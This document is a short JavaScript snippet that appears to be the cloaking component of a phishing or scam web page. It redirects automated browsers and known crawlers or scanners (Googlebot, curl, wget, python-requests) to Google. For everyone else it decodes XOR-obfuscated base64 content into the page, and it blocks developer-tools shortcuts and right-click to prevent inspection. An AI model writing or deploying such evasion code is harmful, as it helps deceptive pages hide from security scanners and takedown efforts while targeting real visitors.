(function() {
    // Block headless automation tools (Puppeteer, Selenium, Playwright)
    if (navigator.webdriver) {
        window.location.replace("https://www.google.com");
        return;
    }

    // Block known scanners/crawlers - NOT regular browsers like Chrome/Edge
    var ua = navigator.userAgent || '';
    var crawlerPatterns = /Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|Exabot|facebot|ia_archiver|python-requests|python\/|curl\/|wget\//i;
    if (crawlerPatterns.test(ua)) {
        window.location.replace("https://www.google.com");
        return;
    }

    // Decoder for polymorphic content
    window._dc = function(b64) {
        try {
            var bin = atob(b64);
            var out = '';
            for (var i = 0; i < bin.length; i++) {
                out += String.fromCharCode(bin.charCodeAt(i) ^ 0x42);
            }
            return out;
        } catch(e) { return ''; }
    };

    // Decode and inject polymorphic content after DOM is ready
    function injectContent() {
        var els = document.querySelectorAll('[data-p]');
        for (var i = 0; i < els.length; i++) {
            try {
                var el = els[i];
                var decoded = window._dc(el.getAttribute('data-p'));
                if (!decoded) continue;
                if (el.tagName === 'TITLE') {
                    document.title = decoded;
                } else {
                    el.innerHTML = decoded;
                }
            } catch(e) {}
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectContent);
    } else {
        injectContent();
    }

    // Disable devtools shortcuts (anti-inspect)
    document.addEventListener('keydown', function(e) {
        if (e.keyCode === 123) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
    });
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
})();
